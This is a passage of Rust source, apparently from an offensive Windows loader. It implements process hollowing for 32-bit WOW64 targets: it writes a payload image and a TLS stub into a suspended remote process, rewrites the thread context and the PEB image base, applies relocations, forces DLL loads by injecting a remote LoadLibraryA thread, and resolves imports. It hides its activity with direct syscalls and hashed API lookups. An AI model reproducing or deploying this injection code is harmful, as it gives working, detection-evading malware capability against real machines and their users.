            stub.len() as u64,
            &mut stub_written as *mut _ as u64,
        )
        .unwrap_or(-1);
        if write_s < 0 || stub_written != stub.len() {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): NtWriteVirtualMemory for TLS stub failed: status={:#010x}, wrote={}, expected={}",
                write_s as u32,
                stub_written,
                stub.len()
            ));
        }

        // Make the stub executable (RX).
        let mut prot_base = stub_mem;
        let mut prot_size = stub.len();
        let mut old_prot = 0u32;
        let prot_s = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_process as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        )
        .unwrap_or(-1);
        if prot_s < 0 {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): NtProtectVirtualMemory(RX) for TLS stub failed: {:#010x}",
                prot_s as u32
            ));
        }

        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_process as u64,
            stub_mem as u64,
            stub.len() as u64,
        );

        tracing::debug!(
            "hollow_and_execute(pe32): injected TLS stub at {:p} ({} TLS callbacks)",
            stub_mem,
            tls_callback_vas32.len(),
        );

        stub_mem as u32
    } else {
        remote_base32.wrapping_add(entry_point_rva as u32)
    };

    // Resolve WOW64 context APIs from kernel32.
    // NtGetContextThread / NtSetContextThread from a 64-bit caller cannot
    // correctly operate on WOW64 (32-bit) thread contexts.  The kernel32
    // Wow64GetThreadContext / Wow64SetThreadContext wrappers handle the
    // necessary translation.
    let wow64_get_ctx: Option<unsafe extern "system" fn(*mut c_void, *mut WOW64_CONTEXT) -> i32> = {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
        match kernel32 {
            Some(k32) => {
                let addr = pe_resolve::get_proc_address_by_hash(
                    k32,
                    pe_resolve::hash_str(b"Wow64GetThreadContext\0"),
                );
                addr.map(|a| std::mem::transmute(a))
            }
            None => None,
        }
    };
    let wow64_set_ctx: Option<unsafe extern "system" fn(*mut c_void, *const WOW64_CONTEXT) -> i32> = {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
        match kernel32 {
            Some(k32) => {
                let addr = pe_resolve::get_proc_address_by_hash(
                    k32,
                    pe_resolve::hash_str(b"Wow64SetThreadContext\0"),
                );
                addr.map(|a| std::mem::transmute(a))
            }
            None => None,
        }
    };

    let mut ctx: WOW64_CONTEXT = zeroed();
    ctx.ContextFlags = WOW64_CONTEXT_FULL;

    // Get WOW64 thread context — prefer Wow64GetThreadContext, fall back to
    // NtGetContextThread if the kernel32 export is unavailable.
    let get_ok = if let Some(wow64_get) = wow64_get_ctx {
        wow64_get(h_thread, &mut ctx) != 0
    } else {
        tracing::warn!(
            "hollow_and_execute(pe32): Wow64GetThreadContext not found; falling back to NtGetContextThread"
        );
        match nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        ) {
            Ok(s) if s >= 0 => true,
            Ok(s) => {
                nt_terminate!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute(pe32): NtGetContextThread failed: NTSTATUS {:#010x}",
                    s as u32
                ));
            }
            Err(e) => {
                nt_terminate!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute(pe32): NtGetContextThread failed: {}",
                    e
                ));
            }
        }
    };

    if !get_ok {
        nt_terminate!(h_process);
        close_handle!(h_thread);
        close_handle!(h_process);
        return Err(anyhow!(
            "hollow_and_execute(pe32): Wow64GetThreadContext returned FALSE"
        ));
    }

    {
        let peb_ptr = ctx.Ebx as usize as *const u8;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            peb_ptr.add(0x8) as u64,
            &remote_base32 as *const _ as u64,
            std::mem::size_of::<u32>() as u64,
            &mut written as *mut _ as u64,
        );

        ctx.Eax = thread_start_eax;
        ctx.Eip = thread_start_eax;

        // Set WOW64 thread context — prefer Wow64SetThreadContext.
        let set_ok = if let Some(wow64_set) = wow64_set_ctx {
            wow64_set(h_thread, &ctx) != 0
        } else {
            tracing::warn!(
                "hollow_and_execute(pe32): Wow64SetThreadContext not found; falling back to NtSetContextThread"
            );
            match nt_syscall::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            ) {
                Ok(s2) if s2 >= 0 => true,
                Ok(s2) => {
                    nt_terminate!(h_process);
                    close_handle!(h_thread);
                    close_handle!(h_process);
                    return Err(anyhow!(
                        "hollow_and_execute(pe32): NtSetContextThread failed: NTSTATUS {:#010x}",
                        s2 as u32
                    ));
                }
                Err(e) => {
                    nt_terminate!(h_process);
                    close_handle!(h_thread);
                    close_handle!(h_process);
                    return Err(anyhow!(
                        "hollow_and_execute(pe32): NtSetContextThread failed: {}",
                        e
                    ));
                }
            }
        };

        if !set_ok {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): Wow64SetThreadContext returned FALSE"
            ));
        }
    }

    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_process as u64,
        remote_base as u64,
        (*nt).OptionalHeader.SizeOfImage as u64,
    );

    let resume_status = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
    match resume_status {
        Ok(s) if s >= 0 => {}
        Ok(s) => {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): NtResumeThread failed: NTSTATUS {:#010x}",
                s as u32
            ));
        }
        Err(e) => {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): NtResumeThread failed: {}",
                e
            ));
        }
    }

    close_handle!(h_thread);
    close_handle!(h_process);
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_relocations_remote32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }
    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;

    let reloc_file_off = rva_to_file_offset32(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off
        .checked_add(reloc_dir.Size as usize)
        .ok_or_else(|| {
            anyhow!("apply_relocations_remote32: relocation directory range overflow")
        })?;
    if reloc_end_off > payload.len() {
        return Err(anyhow!(
            "apply_relocations_remote32: relocation directory out of payload bounds (off={:#x}, size={:#x}, payload={:#x})",
            reloc_file_off,
            reloc_dir.Size,
            payload.len()
        ));
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            return Err(anyhow!(
                "apply_relocations_remote32: invalid relocation block size {} at file offset {:#x}",
                block_size,
                offset
            ));
        }
        let block_end = offset.checked_add(block_size).ok_or_else(|| {
            anyhow!("apply_relocations_remote32: relocation block range overflow")
        })?;
        if block_end > reloc_end_off {
            return Err(anyhow!(
                "apply_relocations_remote32: relocation block overruns directory (block_end={:#x}, reloc_end={:#x})",
                block_end,
                reloc_end_off
            ));
        }

        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > block_end {
                return Err(anyhow!(
                    "apply_relocations_remote32: truncated relocation entry at file offset {:#x}",
                    entry_off
                ));
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            match typ {
                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                // bits of the signed delta, giving correct modular results even
                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                3 => {
                    let target_rva = page_rva.checked_add(rel).ok_or_else(|| {
                        anyhow!("apply_relocations_remote32: target RVA overflow")
                    })?;
                    let end_rva = target_rva.checked_add(4).ok_or_else(|| {
                        anyhow!("apply_relocations_remote32: relocation target range overflow")
                    })?;
                    if end_rva > image_size {
                        return Err(anyhow!(
                            "apply_relocations_remote32: relocation target out of image bounds (rva={:#x}, size=4, image={:#x})",
                            target_rva,
                            image_size
                        ));
                    }
                    let target_addr = remote_base
                        .checked_add(target_rva)
                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target VA overflow"))?;
                    let target = target_addr as *mut c_void;

                    let mut val: u32 = 0;
                    let mut rd: usize = 0;
                    let rs = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &mut val as *mut _ as u64,
                        4u64,
                        &mut rd as *mut _ as u64,
                    );
                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 4 {
                        return Err(anyhow!(
                            "apply_relocations_remote32: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
                            target as usize,
                            rs,
                            rd
                        ));
                    }

                    let patched = val.wrapping_add(delta as u32);
                    let mut wr: usize = 0;
                    let ws = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &patched as *const _ as u64,
                        4u64,
                        &mut wr as *mut _ as u64,
                    );
                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 4 {
                        return Err(anyhow!(
                            "apply_relocations_remote32: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
                            target as usize,
                            ws,
                            wr
                        ));
                    }
                }
                // IMAGE_REL_BASED_DIR64 (accepted for completeness)
                10 => {
                    let target_rva = page_rva.checked_add(rel).ok_or_else(|| {
                        anyhow!("apply_relocations_remote32: target RVA overflow")
                    })?;
                    let end_rva = target_rva.checked_add(8).ok_or_else(|| {
                        anyhow!("apply_relocations_remote32: relocation target range overflow")
                    })?;
                    if end_rva > image_size {
                        return Err(anyhow!(
                            "apply_relocations_remote32: relocation target out of image bounds (rva={:#x}, size=8, image={:#x})",
                            target_rva,
                            image_size
                        ));
                    }
                    let target_addr = remote_base
                        .checked_add(target_rva)
                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target VA overflow"))?;
                    let target = target_addr as *mut c_void;

                    let mut val: u64 = 0;
                    let mut rd: usize = 0;
                    let rs = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &mut val as *mut _ as u64,
                        8u64,
                        &mut rd as *mut _ as u64,
                    );
                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 8 {
                        return Err(anyhow!(
                            "apply_relocations_remote32: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
                            target as usize,
                            rs,
                            rd
                        ));
                    }

                    val = val.wrapping_add(delta as u64);
                    let mut wr: usize = 0;
                    let ws = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &val as *const _ as u64,
                        8u64,
                        &mut wr as *mut _ as u64,
                    );
                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 8 {
                        return Err(anyhow!(
                            "apply_relocations_remote32: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
                            target as usize,
                            ws,
                            wr
                        ));
                    }
                }
                _ => {}
            }
        }
        offset = block_end;
    }
    Ok(())
}

#[cfg(windows)]
#[repr(C)]
struct ListEntry32 {
    flink: u32,
    blink: u32,
}

#[cfg(windows)]
#[repr(C)]
struct UnicodeString32 {
    length: u16,
    maximum_length: u16,
    buffer: u32,
}

#[cfg(windows)]
#[repr(C)]
struct Peb32 {
    inherited_address_space: u8,
    read_image_file_exec_options: u8,
    being_debugged: u8,
    spare_bool: u8,
    mutant: u32,
    image_base_address: u32,
    ldr: u32,
}

#[cfg(windows)]
#[repr(C)]
struct PebLdrData32 {
    length: u32,
    initialized: u8,
    _pad0: [u8; 3],
    ss_handle: u32,
    in_load_order_module_list: ListEntry32,
    in_memory_order_module_list: ListEntry32,
    in_initialization_order_module_list: ListEntry32,
}

#[cfg(windows)]
#[repr(C)]
struct LdrDataTableEntry32 {
    in_load_order_links: ListEntry32,
    in_memory_order_links: ListEntry32,
    in_initialization_order_links: ListEntry32,
    dll_base: u32,
    entry_point: u32,
    size_of_image: u32,
    full_dll_name: UnicodeString32,
    base_dll_name: UnicodeString32,
}

#[cfg(windows)]
unsafe fn read_remote_exact32(
    hprocess: *mut c_void,
    remote_addr: usize,
    len: usize,
    context: &str,
) -> Result<Vec<u8>> {
    let mut buf = vec![0u8; len];
    let mut bytes_read = 0usize;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        hprocess as u64,
        remote_addr as u64,
        buf.as_mut_ptr() as u64,
        len as u64,
        &mut bytes_read as *mut _ as u64,
    )
    .unwrap_or(-1);
    if status < 0 || bytes_read != len {
        return Err(anyhow!(
            "{}: NtReadVirtualMemory at {:#x} len={:#x} failed (status={:#010x}, read={:#x})",
            context,
            remote_addr,
            len,
            status as u32,
            bytes_read
        ));
    }
    Ok(buf)
}

#[cfg(windows)]
unsafe fn read_remote_struct32<T>(
    hprocess: *mut c_void,
    remote_addr: usize,
    context: &str,
) -> Result<T> {
    let bytes = read_remote_exact32(hprocess, remote_addr, std::mem::size_of::<T>(), context)?;
    let mut out = std::mem::MaybeUninit::<T>::uninit();
    std::ptr::copy_nonoverlapping(
        bytes.as_ptr(),
        out.as_mut_ptr() as *mut u8,
        std::mem::size_of::<T>(),
    );
    Ok(out.assume_init())
}

#[cfg(windows)]
unsafe fn build_remote_module_map32(
    hprocess: *mut c_void,
) -> Result<std::collections::HashMap<String, usize>> {
    const PROCESS_WOW64_INFORMATION: u32 = 26;

    let mut wow64_peb: usize = 0;
    let mut return_len: u32 = 0;
    let status = nt_syscall::syscall!(
        "NtQueryInformationProcess",
        hprocess as u64,
        PROCESS_WOW64_INFORMATION as u64,
        &mut wow64_peb as *mut _ as u64,
        std::mem::size_of::<usize>() as u64,
        &mut return_len as *mut _ as u64,
    )
    .unwrap_or(-1);

    if status < 0 || wow64_peb == 0 {
        return Err(anyhow!(
            "build_remote_module_map32: NtQueryInformationProcess(ProcessWow64Information) failed (status={:#010x}, peb32={:#x})",
            status as u32,
            wow64_peb
        ));
    }

    let peb32: Peb32 =
        read_remote_struct32(hprocess, wow64_peb, "build_remote_module_map32: PEB32")?;
    if peb32.ldr == 0 {
        return Err(anyhow!(
            "build_remote_module_map32: remote PEB32.Ldr is null"
        ));
    }

    let ldr32: PebLdrData32 = read_remote_struct32(
        hprocess,
        peb32.ldr as usize,
        "build_remote_module_map32: PEB_LDR_DATA32",
    )?;
    let list_head = (peb32.ldr as usize + 0x0C) as u32;
    let mut current = ldr32.in_load_order_module_list.flink;
    let mut guard = 0usize;
    let mut map = std::collections::HashMap::new();

    while current != 0 && current != list_head && guard < 4096 {
        guard += 1;

        let entry: LdrDataTableEntry32 = match read_remote_struct32(
            hprocess,
            current as usize,
            "build_remote_module_map32: LDR_DATA_TABLE_ENTRY32",
        ) {
            Ok(v) => v,
            Err(_) => break,
        };

        if entry.dll_base != 0
            && entry.base_dll_name.buffer != 0
            && entry.base_dll_name.length >= 2
            && (entry.base_dll_name.length as usize) <= 520
        {
            let raw = read_remote_exact32(
                hprocess,
                entry.base_dll_name.buffer as usize,
                entry.base_dll_name.length as usize,
                "build_remote_module_map32: BaseDllName",
            )
            .unwrap_or_default();

            if !raw.is_empty() {
                let mut wide = Vec::with_capacity(raw.len() / 2);
                for chunk in raw.chunks_exact(2) {
                    wide.push(u16::from_le_bytes([chunk[0], chunk[1]]));
                }
                let name = String::from_utf16_lossy(&wide);
                let norm = normalize_dll_name(&name);
                map.insert(norm, entry.dll_base as usize);
            }
        }

        current = entry.in_load_order_links.flink;
    }

    Ok(map)
}

#[cfg(windows)]
unsafe fn load_remote_module_via_loadlibrary_a(
    hprocess: *mut c_void,
    dll_name: &str,
    load_library_a_addr: usize,
) -> Result<()> {
    let mut dll_name_c = dll_name.as_bytes().to_vec();
    dll_name_c.push(0);

    let mut remote_str: *mut c_void = std::ptr::null_mut();
    let mut remote_str_size = dll_name_c.len();
    let alloc_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        hprocess as u64,
        &mut remote_str as *mut _ as u64,
        0u64,
        &mut remote_str_size as *mut _ as u64,
        (windows_sys::Win32::System::Memory::MEM_COMMIT
            | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
        windows_sys::Win32::System::Memory::PAGE_READWRITE as u64,
    )
    .unwrap_or(-1);
    if alloc_status < 0 || remote_str.is_null() {
        return Err(anyhow!(
            "load_remote_module_via_loadlibrary_a: NtAllocateVirtualMemory failed for {}",
            dll_name
        ));
    }

    let free_remote_str = || {
        let mut free_base = remote_str;
        let mut free_size: usize = 0;
        let _ = nt_syscall::syscall!(
            "NtFreeVirtualMemory",
            hprocess as u64,
            &mut free_base as *mut _ as u64,
            &mut free_size as *mut _ as u64,
            NT_MEM_RELEASE as u64,
        );
    };

    let mut written = 0usize;
    let write_status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        hprocess as u64,
        remote_str as u64,
        dll_name_c.as_ptr() as u64,
        dll_name_c.len() as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1);
    if write_status < 0 || written != dll_name_c.len() {
        free_remote_str();
        return Err(anyhow!(
            "load_remote_module_via_loadlibrary_a: NtWriteVirtualMemory failed for {}",
            dll_name
        ));
    }

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let create_status = nt_syscall::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_INJECT_ACCESS as u64,
        0u64,
        hprocess as u64,
        load_library_a_addr as u64,
        remote_str as u64,
        0u64,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .unwrap_or(-1);
    if create_status < 0 || h_thread.is_null() {
        free_remote_str();
        return Err(anyhow!(
            "load_remote_module_via_loadlibrary_a: NtCreateThreadEx failed for {}: {:#010x}",
            dll_name,
            create_status as u32
        ));
    }

    // 30-second relative timeout prevents indefinite hang if LoadLibraryA
    // stalls in the remote process.
    let wait_timeout: i64 = -30_000_000_0i64; // -30s in 100ns units
    let _ = nt_syscall::syscall!(
        "NtWaitForSingleObject",
        h_thread as u64,
        0u64,
        &wait_timeout as *const _ as u64,
    );
    let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
    free_remote_str();
    Ok(())
}

#[cfg(windows)]
unsafe fn ensure_remote_module_loaded32_cached(
    hprocess: *mut c_void,
    dll_name: &str,
    remote_modules: &mut std::collections::HashMap<String, usize>,
    load_library_a_addr: Option<usize>,
) -> Result<usize> {
    let key = normalize_dll_name(dll_name);
    if let Some(&base) = remote_modules.get(&key) {
        return Ok(base);
    }

    let loader = load_library_a_addr.ok_or_else(|| {
        anyhow!(
            "ensure_remote_module_loaded32_cached: LoadLibraryA is unavailable while trying to load {}",
            key
        )
    })?;
    load_remote_module_via_loadlibrary_a(hprocess, &key, loader)?;

    *remote_modules = build_remote_module_map32(hprocess)?;
    remote_modules.get(&key).copied().ok_or_else(|| {
        anyhow!(
            "ensure_remote_module_loaded32_cached: {} still not present in target after LoadLibraryA",
            key
        )
    })
}

#[cfg(windows)]
unsafe fn resolve_remote_export32(
    hprocess: *mut c_void,
    remote_dll_base: usize,
    fn_name: &str,
    remote_modules: &mut std::collections::HashMap<String, usize>,
    load_library_a_addr: Option<usize>,
    depth: u32,
) -> Result<usize> {
    if depth >= MAX_EXPORT_FORWARD_DEPTH {
        return Err(anyhow!(
            "resolve_remote_export32: forwarder chain too deep at {}",
            fn_name
        ));
    }

    let dos = read_remote_exact32(hprocess, remote_dll_base, 64, "resolve_remote_export32")?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        return Err(anyhow!(
            "resolve_remote_export32: bad DOS magic at {:#x}: {:#x}",
            remote_dll_base,
            e_magic
        ));
    }
    let e_lfanew = i32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap());
    if e_lfanew < 0 {
        return Err(anyhow!(
            "resolve_remote_export32: negative e_lfanew at {:#x}",
            remote_dll_base
        ));
    }

    let nt = read_remote_exact32(
        hprocess,
        remote_dll_base + e_lfanew as usize,
        128,
        "resolve_remote_export32",
    )?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        return Err(anyhow!(
            "resolve_remote_export32: bad PE signature at {:#x}",
            remote_dll_base
        ));
    }

    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x010B {
        return Err(anyhow!(
            "resolve_remote_export32: unsupported optional-header magic {:#x} at {:#x}",
            opt_magic,
            remote_dll_base
        ));
    }

    let export_rva = u32::from_le_bytes(nt[120..124].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[124..128].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        return Err(anyhow!(
            "resolve_remote_export32: DLL at {:#x} has no export directory",
            remote_dll_base
        ));
    }

    let exp = read_remote_exact32(
        hprocess,
        remote_dll_base + export_rva,
        export_size,
        "resolve_remote_export32",
    )?;
    let num_names = u32::from_le_bytes(exp[24..28].try_into().unwrap()) as usize;
    let fn_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
    let name_table_rva = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as usize;
    let ordinal_table_rva = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as usize;

    let name_ptrs = read_remote_exact32(
        hprocess,
        remote_dll_base + name_table_rva,
        num_names * 4,
        "resolve_remote_export32",
    )?;
    let ordinals = read_remote_exact32(
        hprocess,
        remote_dll_base + ordinal_table_rva,
        num_names * 2,
        "resolve_remote_export32",
    )?;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
        let name_raw = read_remote_exact32(
            hprocess,
            remote_dll_base + name_rva,
            256,
            "resolve_remote_export32",
        )
        .unwrap_or_else(|_| vec![0u8; 256]);
        let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
        let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
        if name != fn_name {
            continue;
        }

        let ordinal = u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
        let fn_rva_bytes = read_remote_exact32(
            hprocess,
            remote_dll_base + fn_table_rva + ordinal * 4,
            4,
            "resolve_remote_export32",
        )?;
        let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
        if fn_rva >= export_rva && fn_rva < export_rva + export_size {
            let forwarder_raw = read_remote_exact32(
                hprocess,
                remote_dll_base + fn_rva,
                256,
                "resolve_remote_export32 forwarder",
            )?;
            let nul = forwarder_raw
                .iter()
                .position(|&b| b == 0)
                .unwrap_or(forwarder_raw.len());
            let forwarder = std::str::from_utf8(&forwarder_raw[..nul]).unwrap_or("");
            return resolve_remote_forwarder_export32(
                hprocess,
                forwarder,
                remote_modules,
                load_library_a_addr,
                depth + 1,
            );
        }
        return Ok(remote_dll_base + fn_rva);
    }

    Err(anyhow!(
        "resolve_remote_export32: '{}' not found in DLL at {:#x}",
        fn_name,
        remote_dll_base
    ))
}

#[cfg(windows)]
unsafe fn resolve_remote_export32_by_ordinal(
    hprocess: *mut c_void,
    remote_dll_base: usize,
    ordinal: u16,
    remote_modules: &mut std::collections::HashMap<String, usize>,
    load_library_a_addr: Option<usize>,
    depth: u32,
) -> Result<usize> {
    if depth >= MAX_EXPORT_FORWARD_DEPTH {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: forwarder chain too deep at ordinal {}",
            ordinal
        ));
    }

    let dos = read_remote_exact32(
        hprocess,
        remote_dll_base,
        64,
        "resolve_remote_export32_by_ordinal",
    )?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: bad DOS magic at {:#x}: {:#x}",
            remote_dll_base,
            e_magic
        ));
    }
    let e_lfanew = i32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap());
    if e_lfanew < 0 {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: negative e_lfanew at {:#x}",
            remote_dll_base
        ));
    }

    let nt = read_remote_exact32(
        hprocess,
        remote_dll_base + e_lfanew as usize,
        128,
        "resolve_remote_export32_by_ordinal",
    )?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: bad PE signature at {:#x}",
            remote_dll_base
        ));
    }

    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x010B {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: unsupported optional-header magic {:#x} at {:#x}",
            opt_magic,
            remote_dll_base
        ));
    }

    let export_rva = u32::from_le_bytes(nt[120..124].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[124..128].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: DLL at {:#x} has no export directory",
            remote_dll_base
        ));
    }

    let exp = read_remote_exact32(
        hprocess,
        remote_dll_base + export_rva,
        export_size,
        "resolve_remote_export32_by_ordinal",
    )?;
    let ordinal_base = u32::from_le_bytes(exp[16..20].try_into().unwrap());
    let function_count = u32::from_le_bytes(exp[20..24].try_into().unwrap());
    let function_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;

    let ordinal_u32 = ordinal as u32;
    if ordinal_u32 < ordinal_base {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: ordinal {} is below export base {} at {:#x}",
            ordinal,
            ordinal_base,
            remote_dll_base
        ));
    }
    let index = (ordinal_u32 - ordinal_base) as usize;
    if index >= function_count as usize {
        return Err(anyhow!(
            "resolve_remote_export32_by_ordinal: ordinal {} index {} exceeds function count {} at {:#x}",
            ordinal,
            index,
            function_count,
            remote_dll_base
        ));
    }

    let fn_rva_bytes = read_remote_exact32(
        hprocess,
        remote_dll_base + function_table_rva + index * 4,
        4,
        "resolve_remote_export32_by_ordinal",
    )?;
    let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
    if fn_rva >= export_rva && fn_rva < export_rva + export_size {
        let forwarder_raw = read_remote_exact32(
            hprocess,
            remote_dll_base + fn_rva,
            256,
            "resolve_remote_export32_by_ordinal forwarder",
        )?;
        let nul = forwarder_raw
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(forwarder_raw.len());
        let forwarder = std::str::from_utf8(&forwarder_raw[..nul]).unwrap_or("");
        return resolve_remote_forwarder_export32(
            hprocess,
            forwarder,
            remote_modules,
            load_library_a_addr,
            depth + 1,
        );
    }

    Ok(remote_dll_base + fn_rva)
}

#[cfg(windows)]
unsafe fn resolve_remote_forwarder_export32(
    hprocess: *mut c_void,
    forwarder: &str,
    remote_modules: &mut std::collections::HashMap<String, usize>,
    load_library_a_addr: Option<usize>,
    depth: u32,
) -> Result<usize> {
    let (module_part, symbol_part) = forwarder.rsplit_once('.').ok_or_else(|| {
        anyhow!(
            "resolve_remote_forwarder_export32: malformed forwarder string '{}'",
            forwarder
        )
    })?;

    let module_name = normalize_dll_name(module_part);
    let remote_module_base = ensure_remote_module_loaded32_cached(
        hprocess,
        &module_name,
        remote_modules,
        load_library_a_addr,
    )?;

    if let Some(ord_text) = symbol_part.strip_prefix('#') {
        let ord = ord_text.parse::<u16>().map_err(|e| {
            anyhow!(
                "resolve_remote_forwarder_export32: invalid ordinal '{}' in forwarder '{}': {}",
                ord_text,
                forwarder,
                e
            )
        })?;
        resolve_remote_export32_by_ordinal(
            hprocess,
            remote_module_base,
            ord,
            remote_modules,
            load_library_a_addr,
            depth,
        )
    } else {
        resolve_remote_export32(
            hprocess,
            remote_module_base,
            symbol_part,
            remote_modules,
            load_library_a_addr,
            depth,
        )
    }
}

#[cfg(windows)]
unsafe fn fix_iat_remote32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32,
    payload: &[u8],
    written: &mut usize,
) -> Result<()> {
    use std::collections::HashMap;

    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let mut remote_modules: HashMap<String, usize> = build_remote_module_map32(hprocess)?;
    let kernel32_base = remote_modules
        .get("kernel32.dll")
        .copied()
        .ok_or_else(|| anyhow!("fix_iat_remote32: kernel32.dll is not loaded in target process"))?;
    let load_library_a_addr = Some(resolve_remote_export32(
        hprocess,
        kernel32_base,
        "LoadLibraryA",
        &mut remote_modules,
        None,
        0,
    )?);

    let mut unresolved_count: usize = 0;
    let mut desc_off = rva_to_file_offset32(import_dir.VirtualAddress as usize, nt);
    loop {
        if desc_off + 20 > payload.len() {
            break;
